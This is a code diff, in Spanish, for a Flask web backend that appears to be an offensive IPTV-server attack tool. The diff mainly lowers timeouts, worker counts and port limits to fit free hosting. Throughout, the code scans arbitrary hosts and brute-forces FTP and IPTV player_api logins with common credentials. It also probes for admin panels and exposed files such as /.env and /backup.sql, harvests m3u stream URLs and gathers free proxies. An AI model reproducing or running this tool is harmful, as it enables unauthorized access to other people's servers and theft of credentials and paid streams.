@@ -19,9 +19,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 CORS(app)
 
-# ===== CONFIGURACIÓN =====
-TIMEOUT = 5
-MAX_WORKERS = 50
+# ===== CONFIGURACIÓN OPTIMIZADA PARA RENDER GRATIS =====
+TIMEOUT = 3                    # Reducido de 5 a 3
+MAX_WORKERS = 10                # Reducido de 50 a 10
+MAX_PORTS_PER_SCAN = 30         # Límite de puertos por scan
 
 # ===== PUERTOS IPTV COMPLETOS (de app.py) =====
 IPTV_PORTS = [
@@ -126,11 +127,11 @@ def get_free_proxies():
                     proxy = line.strip()
                     if ':' in proxy:
                         proxies.append(proxy)
-                        if len(proxies) >= 50:
+                        if len(proxies) >= 30:  # Reducido de 50 a 30
                             break
         except:
             continue
-    return list(set(proxies))[:30]
+    return list(set(proxies))[:20]  # Reducido de 30 a 20
 
 # ===== FUNCIONES DE UTILIDAD (de app.py) =====
 def get_service_name(port):
@@ -166,21 +167,21 @@ def check_ftp_vulnerabilities(host, port=21):
     results = {'anonymous': False, 'creds': []}
     try:
         ftp = ftplib.FTP()
-        ftp.connect(host, port, timeout=5)
+        ftp.connect(host, port, timeout=3)  # Reducido de 5 a 3
         ftp.login()
         results['anonymous'] = True
         try:
             files = ftp.nlst()
-            results['files'] = files[:10]
+            results['files'] = files[:5]  # Reducido de 10 a 5
         except:
             pass
         ftp.quit()
     except:
         pass
-    for user, pwd in COMMON_CREDS[:10]:
+    for user, pwd in COMMON_CREDS[:5]:  # Reducido de 10 a 5
         try:
             ftp = ftplib.FTP()
-            ftp.connect(host, port, timeout=3)
+            ftp.connect(host, port, timeout=2)  # Reducido de 3 a 2
             ftp.login(user, pwd)
             results['creds'].append({'username': user, 'password': pwd})
             ftp.quit()
@@ -194,9 +195,9 @@ def check_http_vulnerabilities(host, port, ssl=False):
     base_url = f"{protocol}://{host}:{port}"
     results = {'admin_panels': [], 'm3u_files': [], 'sensitive_files': [], 'creds': []}
     paths = {
-        'admin': ['/admin', '/panel', '/cpanel', '/login', '/wp-admin', '/manager'],
-        'm3u': ['/playlist.m3u', '/tv.m3u', '/live.m3u', '/get.php', '/player_api.php'],
-        'sensitive': ['/phpinfo.php', '/.env', '/config.php', '/backup.sql', '/info.php']
+        'admin': ['/admin', '/panel', '/login', '/manager'],  # Reducido
+        'm3u': ['/playlist.m3u', '/get.php', '/player_api.php'],  # Reducido
+        'sensitive': ['/phpinfo.php', '/.env']  # Reducido
     }
     for category, path_list in paths.items():
         for path in path_list:
@@ -218,8 +219,8 @@ def check_iptv_vulnerabilities(host, port):
     protocol = 'https' if port in [443, 8443, 25462, 25464] else 'http'
     base_url = f"{protocol}://{host}:{port}"
     results = {'creds': [], 'm3u_urls': []}
-    for endpoint in IPTV_ENDPOINTS[:10]:
-        for user, pwd in COMMON_CREDS[:10]:
+    for endpoint in IPTV_ENDPOINTS[:5]:  # Reducido de 10 a 5
+        for user, pwd in COMMON_CREDS[:5]:  # Reducido de 10 a 5
             try:
                 if 'player_api' in endpoint or 'api.php' in endpoint:
                     url = f"{base_url}{endpoint}?username={user}&password={pwd}"
@@ -297,7 +298,7 @@ def scan_port(host, port):
 def health():
     return jsonify({
         'status': 'ok',
-        'version': '5.0 - ULTIMATE EDITION',
+        'version': '5.0 - ULTIMATE EDITION (OPTIMIZED)',
         'ports_available': len(IPTV_PORTS),
         'message': '🔥 CHERRY BACKEND CON TECNOLOGÍA ULTIMATE HOST'
     })
@@ -320,17 +321,24 @@ def scan():
                 port_list.append(int(p.strip()))
             except:
                 pass
+        # Limitar a MAX_PORTS_PER_SCAN si viene del frontend
+        if len(port_list) > MAX_PORTS_PER_SCAN:
+            port_list = port_list[:MAX_PORTS_PER_SCAN]
     else:
-        port_list = IPTV_PORTS[:100]
+        port_list = IPTV_PORTS[:MAX_PORTS_PER_SCAN]  # Usar límite
     
     results = []
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        futures = {executor.submit(scan_port, host, p): p for p in port_list}
-        for future in futures:
-            try:
-                results.append(future.result(timeout=TIMEOUT+2))
-            except:
-                results.append({'port': futures[future], 'open': False})
+    # Usar batches más pequeños para no saturar memoria
+    batch_size = 5
+    for i in range(0, len(port_list), batch_size):
+        batch = port_list[i:i+batch_size]
+        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(batch))) as executor:
+            futures = {executor.submit(scan_port, host, p): p for p in batch}
+            for future in futures:
+                try:
+                    results.append(future.result(timeout=TIMEOUT+2))
+                except:
+                    results.append({'port': futures[future], 'open': False})
     
     open_ports = [r for r in results if r.get('open')]
     vulnerable = [r for r in results if r.get('vulnerable')]
@@ -377,7 +385,7 @@ def scan_quick():
     critical_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 25463, 8081]
     
     results = []
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    with ThreadPoolExecutor(max_workers=5) as executor:  # Reducido de 10 a 5
         futures = {executor.submit(scan_port, host, p): p for p in critical_ports}
         for future in futures:
             try:
@@ -408,7 +416,6 @@ def exploit_heartbleed():
     host = data.get('host')
     port = data.get('port', 443)
     
-    # Placeholder - implementación real pendiente
     return jsonify({
         'success': False,
         'message': 'Heartbleed exploit no implementado en esta versión',
@@ -479,12 +486,11 @@ def clear():
 
 if __name__ == '__main__':
     print("\n" + "="*70)
-    print("🍒 CHERRY BACKEND DEFINITIVO - ULTIMATE EDITION")
+    print("🍒 CHERRY BACKEND - OPTIMIZADO PARA RENDER GRATIS")
     print("="*70)
     print(f"📋 Puertos configurados: {len(IPTV_PORTS)}")
-    print(f"🔧 Escaneo REAL con sockets")
-    print(f"🌍 Geolocalización activada")
-    print(f"🎯 Endpoints IPTV: {len(IPTV_ENDPOINTS)}")
-    print(f"🔑 Credenciales comunes: {len(COMMON_CREDS)}")
+    print(f"⚙️ MAX_WORKERS: {MAX_WORKERS}")
+    print(f"⏱️ TIMEOUT: {TIMEOUT}s")
+    print(f"🎯 Max puertos/scan: {MAX_PORTS_PER_SCAN}")
     print("="*70 + "\n")
     app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
